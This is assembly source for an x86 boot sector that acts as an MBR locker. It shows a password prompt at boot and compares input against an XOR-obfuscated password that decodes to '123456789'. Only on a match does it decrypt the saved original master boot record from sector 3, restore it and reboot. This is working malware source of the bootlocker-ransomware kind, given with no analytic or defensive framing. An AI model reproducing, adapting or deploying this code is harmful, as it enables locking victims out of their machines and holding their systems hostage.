                .x64p 
		.model tiny
PASSWORD_KEY equ       0abh
MBR_KEY      equ       0cdh
; ===========================================================================

; Segment type:	Pure code
RealCode segment byte use16 

start:					; CODE XREF: seg000:00B3j
		mov	ax, cs
		mov	ds, ax
		mov	ss, ax
		mov	es, ax
		mov	sp, 100h
		lea	bp, cs:[7c00h+ShowString];7CB7h
		mov	cx, 29	; ')'
		mov	ax, 1301h
		mov	bx, 0Ch
		mov	dl, 0
		int	10h		; - VIDEO - WRITE STRING (AT,XT286,PS,EGA,VGA)
					; AL = mode, BL	= attribute if AL bit 1	clear, BH = display page number
					; DH,DL	= row,column of	starting cursor	position, CX = length of string
					; ES:BP	-> start of string
		mov	ax, 0B800h
		add	ax, 0A0h ; '?
		mov	ds, ax
		assume ds:nothing
		xor	cx, cx
		xor	bx, bx

GetKey:					; CODE XREF: seg000:003Fj seg000:004Bj
		xor	ax, ax
		int	16h		; KEYBOARD - READ CHAR FROM BUFFER, WAIT IF EMPTY
					; Return: AH = scan code, AL = character
		cmp	al, 8		; backspace
		jz	short PressBackspace
		cmp	al, 0Dh		; enter
		jz	short CheckPassword
		mov	ah, 2
		mov	[bx], al
		mov	[bx+1],	ah
		add	bx, 2
		inc	cx
		jmp	GetKey		; DATA XREF: seg000:0019r
; ---------------------------------------------------------------------------

PressBackspace:				; CODE XREF: seg000:002Dj
		sub	bx, 2
		dec	cx
		xor	ax, ax
		mov	[bx], ax
		jmp	GetKey		; DATA XREF: seg000:0084r seg000:0094r
; ---------------------------------------------------------------------------

CheckPassword:				; CODE XREF: seg000:0031j
		mov	ax, cs
		mov	es, ax
		xor	bx, bx
		;mov	si, 7CE1h
		lea     si,cs:[7c00h+Password]
		xor     byte ptr cs:[7c00h+PasswordLength],PASSWORD_KEY
		mov	cl, byte ptr cs:[7c00h+PasswordLength] ; DATA XREF: seg000:0029r
		mov	ch, 0

loc_5E:					; CODE XREF: seg000:006Dj
		db	3Eh
		mov	al, [bx]
		mov	ah, es:[si]
		xor     ah, PASSWORD_KEY
		cmp	al, ah
		jnz	short NotMatch
		add	bx, 2
		inc	si
		loop	loc_5E
		xor	ax, ax		; password match
		mov	ax, 7E00h
		mov	es, ax
		assume es:nothing
		xor	bx, bx
		mov	ah, 2
		mov	dl, 80h	; '€'
		mov	al, 1
		mov	dh, 0
		mov	ch, 0
		mov	cl, 3
		int	13h		; DISK - READ SECTORS INTO MEMORY
					; AL = number of sectors to read, CH = track, CL = sector
					; DH = head, DL	= drive, ES:BX -> buffer to fill
					; Return: CF set on error, AH =	status,	AL = number of sectors read
					;decrypt original MBR
                mov     cx,200h
decrypt:
		xor     byte ptr es:[bx],MBR_KEY
		inc     bx
		loop    decrypt

		xor	bx, bx
		mov	dl, 80h	; '€'
		mov	ah, 3
		mov	al, 1
		mov	dh, 0
		mov	ch, 0
		mov	cl, 1
		int	13h		; DISK - WRITE SECTORS FROM MEMORY
					; AL = number of sectors to write, CH =	track, CL = sector
					; DH = head, DL	= drive, ES:BX -> buffer
					; Return: CF set on error, AH =	status,	AL = number of sectors written

		jmp	ReturnToBiosToRestart
		;int     19h
; ---------------------------------------------------------------------------

NotMatch:				; CODE XREF: seg000:0066j
		mov	ax, cs
		mov	ds, ax
		mov	ss, ax
		mov	es, ax
		mov	sp, 100h
		lea	bp, cs:[7c00h+PasswordNotMatch];7CB7h
		mov	cx, 45	; ')'
		mov	ax, 1301h
		mov	bx, 0Ch
		mov	dl, 0
		int	10h
		
		xor	ax, ax
		int	16h	
		;jmp	start
; ---------------------------------------------------------------------------

ReturnToBiosToRestart:			; CODE XREF: seg000:0096j
		mov	ax, 0FFFFh	; return to bios startup
		push	ax
		xor	ax, ax
		push	ax
		retf
; ---------------------------------------------------------------------------
ShowString      db    "Please Input Unlock Password:",0		
PasswordLength	db  0a2h ;9			; length
Password	db  9ah	; 1		; pssword
		db  99h	; 2
		db  98h	; 3
		db  9fh	; 4
		db  9eh	; 5
		db  9dh	; 6
		db  9ch	; 7
		db  93h	; 8
		db  92h	; 9
PasswordNotMatch  db  "Password Not Right!,Press Any Key To Restart!",0		
db 510-($-start) dup(0)
		db  55h	; U
		db 0AAh	; ?
RealCode ends

end start 